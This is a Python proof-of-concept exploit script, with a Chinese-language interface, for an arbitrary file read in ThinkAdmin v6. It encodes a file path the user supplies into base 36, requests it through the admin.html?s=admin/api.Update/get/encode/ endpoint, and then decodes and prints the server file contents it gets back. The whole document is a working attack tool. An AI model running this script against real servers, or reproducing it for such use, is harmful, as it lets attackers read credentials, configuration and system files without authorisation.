import requests,json,base64,sys

def baseN(num, b):
  return ((num == 0) and "0") or \
     (baseN(num // b, b).lstrip("0") + "0123456789abcdefghijklmnopqrstuvwxyz"[num % b])

def poc(url):
	while 1:
		s = input("请输入需要读取的文件路径：").encode('utf-8')

		if str(s) == "b'exit'":
			sys.exit(0)

		try:
			poc =""
			for i in s:
				poc += baseN(i,36)

			url = url+"/admin.html?s=admin/api.Update/get/encode/"+poc
			r = requests.get(url)
			if r.status_code == 200:
				if "读取文件内容失败！" in r.text:
					print("读取文件内容失败，请输入正确的文件路径！")

				s1 = json.loads(r.text)["data"]["content"]
				result = base64.b64decode(s1).decode('utf-8')
				print(result)
			else:
				print("不存在漏洞")
				break
		except:
			pass

if __name__ == "__main__":
	if len(sys.argv) == 2:
		poc(sys.argv[1])
	else:
		print("""
 _____ _     _       _     ___      _           _       
|_   _| |   (_)     | |   / _ \    | |         (_)      
  | | | |__  _ _ __ | | _/ /_\ \ __| |_ __ ___  _ _ __  
  | | | '_ \| | '_ \| |/ /  _  |/ _` | '_ ` _ \| | '_ \ 
  | | | | | | | | | |   <| | | | (_| | | | | | | | | | |
  \_/ |_| |_|_|_| |_|_|\_\_| |_/\__,_|_| |_| |_|_|_| |_| v6
                                                        
By: yuyan-sec \t [ThinkAdmin v6 任意文件读取]

Usage： python poc.py [URL]
	python poc.py http://127.0.0.1
			""")
	
